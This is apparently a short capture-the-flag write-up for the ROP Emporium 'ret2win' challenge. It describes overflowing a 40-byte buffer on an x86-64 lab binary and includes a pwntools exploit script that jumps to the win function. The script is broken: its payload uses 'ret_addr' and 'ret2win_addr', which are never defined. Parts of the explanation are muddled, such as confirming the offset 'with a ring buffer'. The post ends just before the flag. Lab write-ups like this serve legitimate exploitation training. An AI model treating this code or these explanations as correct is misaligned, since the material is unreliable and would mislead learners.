## my notes on x86 security permissions and how to approach the exploit 
---
layout: post
author: r3d3y35
---

Solving the rop emporium ret2win challenge

   The challenge's title ret2win refers to a simple rop where we have to exploit the program be forcing entry to the ret function and overwriting its return address with a vulnerable function.
   Since the executable is not stripped we can see the following symbols, where ret2win is the vulnerable function.

<img width="576" height="185" alt="image" src="https://github.com/user-attachments/assets/e62a185c-8673-4346-b4e1-b79172d5f319" />

   In x86-64 systems the garbage bytes are usually of 40 byte length, but we can also confirm this with a ring buffer. 

   I crafted the following exploit using pwntools: 
 
   from pwn import *
   
   ret2win = p64(0x400756)
   ret = p64(0x4006e7)
   payload = b'A' * 40 + ret_addr + ret2win_addr
   
   p = process("./ret2win")
   p.sendlineafter("> ", payload)
   p.interactive()

   Which gives us the flag: 



